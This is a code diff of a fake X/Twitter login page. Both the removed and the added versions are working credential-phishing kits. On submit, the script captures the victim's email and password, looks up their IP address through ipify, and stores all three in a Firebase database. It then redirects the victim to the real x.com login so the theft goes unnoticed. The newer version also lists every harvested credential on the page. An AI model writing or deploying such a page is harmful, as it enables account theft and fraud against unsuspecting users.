@@ -2,65 +2,112 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Log in to X / Twitter</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Login</title>
     <style>
-        *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-        body{background:#f5f8fa;display:flex;height:100vh;margin:0;align-items:center;justify-content:center}
-        .card{background:#fff;width:320px;padding:40px 30px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,.1)}
-        .logo{font-size:28px;font-weight:800;color:#1da1f2;margin-bottom:30px;text-align:center}
-        input{width:100%;padding:12px 15px;margin-bottom:20px;border:1px solid #cfd9de;border-radius:4px;font-size:16px}
-        button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:700;cursor:pointer}
-        button:hover{background:#1a91da}
-        .fineprint{font-size:12px;color:#536471;text-align:center;margin-top:15px}
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+        }
+        .container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 20px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1DA1F2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container button:hover {
+            background-color: #1a91da;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">𝕏</div>
-        <form id="f">
-            <input type="text" name="email" placeholder="Phone, e-mail or username" required autocomplete="username">
-            <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
-            <button>Log in</button>
+    <div class="container">
+        <h2>Sign in to X</h2>
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
         </form>
-        <div class="fineprint">Forgot password? · Sign up for X</div>
+        <div id="data"></div>
     </div>
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-database.js"></script>
 
     <script>
         const firebaseConfig = {
-            projectId: "clickme",
-            databaseURL: "https://YOUR-PROJECT-ID-default-rtdb.europe-west1.firebasedatabase.app"
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
         };
+
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        document.getElementById('f').addEventListener('submit', async function(e) {
+        const form = document.getElementById('login-form');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const dataDiv = document.getElementById('data');
+
+        form.addEventListener('submit', (e) => {
             e.preventDefault();
-            const email = this.email.value.trim();
-            const pass = this.pass.value.trim();
-            let ip = "unknown";
+            const email = emailInput.value;
+            const password = passwordInput.value;
 
-            // Fetch IP via free API (no PHP)
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
 
-            const now = Date.now();
-            db.ref('harvest/' + now).set({
-                email,
-                pass,
-                ip,
-                ua: navigator.userAgent
-            });
+                db.ref('users').push({
+                    email: email,
+                    password: password,
+                    ip: ip
+                });
 
-            // Redirect to real X login
-            setTimeout(() => window.location.replace('https://x.com/login'), 200);
+                dataDiv.innerHTML = '';
+                db.ref('users').on('value', (snapshot) => {
+                    snapshot.forEach((childSnapshot) => {
+                        const childData = childSnapshot.val();
+                        const paragraph = document.createElement('p');
+                        paragraph.textContent = `Email: ${childData.email}, Password: ${childData.password}, IP: ${childData.ip}`;
+                        dataDiv.appendChild(paragraph);
+                    });
+                });
+
+                window.location.href = 'https://x.com/login';
+            })
+            .catch(error => console.error('Error:', error));
         });
     </script>
 </body>
